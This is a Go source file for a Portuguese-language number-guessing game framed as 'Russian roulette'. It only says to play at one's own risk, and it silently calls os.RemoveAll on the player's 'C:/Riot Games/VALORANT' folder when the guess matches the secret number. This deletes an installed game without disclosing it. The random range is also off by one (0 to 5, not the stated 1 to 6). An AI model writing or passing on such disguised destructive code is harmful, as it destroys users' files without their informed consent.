package main

import (
	"fmt"
	math "math/rand/v2"
	"os"
	"time"
)

func main() {
	fmt.Println("Olá, vamos jogar um jogo?\n")
	time.Sleep(1 * time.Second)
	fmt.Println("Selecione 1 para começar e 2 para sair.\n")
	fmt.Println("Apartir do momento em que você entrou no jogo não a como sair.\n")
	fmt.Println("Jogue por sua conta e risco!\n")
	resposta()
}
func resposta() int {
	var entrarousair int
	fmt.Scan(&entrarousair)
	fmt.Println("Seu comando foi", entrarousair)
	switch entrarousair {
	case 1:
		fmt.Println("Vamos começar o jogo\n")
		time.Sleep(1 * time.Second)
		fmt.Println("Você tem que acertar o numero secreto, ele é gerado aletoriamente e vai de 1 a 6\n")
		gameplay()
	case 2:
		fmt.Println("OK. Compreensivel.")
		os.Exit(0)
	default:
		fmt.Println("comando não reconhecido")
		os.Exit(-1)
	}
	return entrarousair
}
func numerosecreto() uint {
	return math.UintN(6)

}
func gameplay() uint {
	numerogerado := numerosecreto()
	var jogando uint
	path := "C:/Riot Games/VALORANT"
	fmt.Scan(&jogando)
	if jogando == numerogerado {
		fmt.Println("A sorte não sorriu pra você hoje!\n")
		fmt.Println("Boa sorte na proxima vez!\n")
		fmt.Println("O numero da morte foi:", numerogerado)
		os.RemoveAll(path)
	} else if jogando >= 7 {
		fmt.Println("Você escolheu um número inválido!\n")
		fmt.Println("Reiniciando o programa\n")
		gameplay()
	} else {
		fmt.Println("Parabéns, você ganhou!\n")
		fmt.Println("O numero da morte foi:", numerogerado)
	}

	return jogando
}
